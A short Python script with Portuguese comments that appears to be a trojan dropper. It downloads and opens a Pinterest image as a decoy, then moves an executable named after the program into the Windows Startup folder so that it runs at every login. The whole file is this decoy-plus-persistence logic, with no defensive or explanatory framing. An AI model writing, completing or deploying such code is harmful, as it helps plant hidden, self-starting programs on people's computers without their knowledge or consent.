import urllib.request as request
from subprocess import call

#URL da imagem
url_img = "https://i.pinimg.com/originals/f6/0f/d0/f60fd0a3c1aa94af172040125e906fa2.png"

#Definindo nome da imagem e renomeando o programa
img_name = "f60fd0a3c1aa94af172040125e906fa2" * 2

#Destino do programa
dest = "%appdata%\"\Microsoft\Windows\Start Menu\Programs\Startup\""

#Baixando a imagem
request.urlretrieve(url_img, img_name + ".png")

#Executando programa
call(f"{img_name}.png && move {img_name}.exe {dest}", shell=True)
